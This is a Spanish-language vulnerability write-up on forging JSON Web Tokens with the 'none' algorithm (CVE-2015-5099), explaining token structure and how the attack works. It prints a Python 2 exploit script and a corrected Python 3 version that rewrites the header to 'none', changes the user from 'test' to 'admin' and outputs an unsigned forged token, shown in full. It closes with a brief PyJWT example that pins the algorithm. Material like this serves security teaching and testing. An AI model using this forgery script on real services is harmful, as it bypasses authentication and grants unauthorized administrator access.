# Análisis de Vulnerabilidad: Falsificación de JWT vía Algoritmo `none` (CVE-2015-5099)

## 1. Introducción al Concepto

Un **JSON Web Token (JWT)** consta de tres partes separadas por puntos (`.`): **Header**, **Payload** y **Signature**.

La seguridad de un JWT radica en que el servidor firma el contenido usando una clave secreta. Si un atacante modifica el Payload, la firma ya no coincide y el servidor rechaza el token.

---

## 2. Análisis del Script Original (Python 2)

El script proporcionado inicialmente intentaba realizar esta explotación de manera rudimentaria:

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ"
header, payload, signature  = jwt.split('.')

# Reemplazando el ALGO y el usuario del payload
header  = header.decode('base64').replace('HS256',"none")
payload = (payload+"==").decode('base64').replace('test','admin')

header  = header.encode('base64').strip().replace("=","")
payload = payload.encode('base64').strip().replace("=","")

# 'The algorithm 'none' is not supported'
print( header+"."+payload+".")
```

> ⚠️ **Usa el código con precaución.**

### Fallos Técnicos del Script Original:

- **Incompatibilidad de Entorno (Python 2 vs Python 3):** Los métodos `.decode('base64')` y `.encode('base64')` directos sobre strings fueron eliminados en Python 3 debido al nuevo manejo de codificaciones binarias/texto.
- **Manejo del Relleno (Padding):** Agregar estáticamente `"=="` al payload puede corromper la cadena si la longitud original no requería exactamente dos caracteres de relleno. El padding de Base64 debe calcularse de forma dinámica (módulo 4).
- **Estándar Base64URL:** Los JWT omiten los caracteres `=`, `+` y `/` para evitar problemas en cabeceras HTTP o URLs. El script original no realizaba la traducción adecuada entre Base64 estándar y Base64URL.

---

## 3. Script Desarrollado y Modernizado (Python 3)

Esta versión soluciona todos los problemas de codificación, maneja el padding de forma dinámica y genera una estructura de token válida para pruebas de concepto (PoC).

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64

def base64url_decode(payload):
    """Decodifica Base64URL calculando el padding dinámicamente."""
    rem = len(payload) % 4
    if rem > 0:
        payload += "=" * (4 - rem)
    return base64.urlsafe_b64decode(payload.encode('utf-8')).decode('utf-8')

def base64url_encode(payload):
    """Codifica a Base64URL removiendo el padding final."""
    encoded = base64.urlsafe_b64encode(payload.encode('utf-8')).decode('utf-8')
    return encoded.rstrip("=")

# 1. Definición del JWT objetivo
jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ"

# 2. Segmentación del token
header, payload, signature = jwt.split('.')

# 3. Decodificación de los datos legibles
decoded_header = base64url_decode(header)
decoded_payload = base64url_decode(payload)

print(f"[*] Header Original:  {decoded_header}")
print(f"[*] Payload Original: {decoded_payload}\n")

# 4. Modificación de parámetros clave (Explotación)
modified_header = decoded_header.replace('HS256', 'none')
modified_payload = decoded_payload.replace('test', 'admin')

# 5. Re-codificación al estándar Base64URL
new_header = base64url_encode(modified_header)
new_payload = base64url_encode(modified_payload)

# 6. Construcción del JWT Falsificado (Nótese el punto final sin firma)
forged_jwt = f"{new_header}.{new_payload}."

print(f"[+] Token Falsificado Exitosamente:")
print(forged_jwt)
```




---




## 4.  Flujo de la Modificación de Datos

Al decodificar las dos primeras secciones del token original, obtenemos texto en formato JSON
```
:Header: {"alg":"HS256","typ":"JWS"} -> Indica que el servidor usó el algoritmo HMAC-SHA256.

Payload: {"login":"test","iat":"1507755570"} -> Identifica al usuario actual como test.

```

## 5.  Re-codificación y Estructura Final
Al volver a codificar, el token falsificado se verá así:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldTIn0.eyJsb2dpbiI6ImFkbWluIiwiaWF0IjoiMTUwNzc1NTU3MCJ9.

```



> ⚠️ **Nota Crítica: El token termina obligatoriamente en un punto (.). Esto le indica al parser del backend que la sección de la firma existe, pero está completamente vacía.**
> # Ejemplo correcto usando PyJWT moderno

```python
jwt.decode(token, secret_key, algorithms=["HS256"])
```


